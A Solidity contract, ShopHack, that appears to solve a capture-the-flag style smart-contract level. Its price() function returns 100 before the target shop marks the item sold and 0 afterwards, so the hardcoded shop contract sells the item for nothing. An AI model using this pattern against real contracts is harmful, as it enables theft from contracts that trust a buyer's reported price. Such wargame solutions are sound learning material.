// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

interface IShop {
    function isSold() external view returns (bool);
    function buy() external;
}

contract ShopHack {
    IShop public shop = IShop(0x8322BB11729Ea87E0c18693D29d2c8866aa10EAa);

    function price() public view returns (uint256) {
        return shop.isSold() ? 0 : 100;
    }

    function buy() public {
        shop.buy();
    }
}
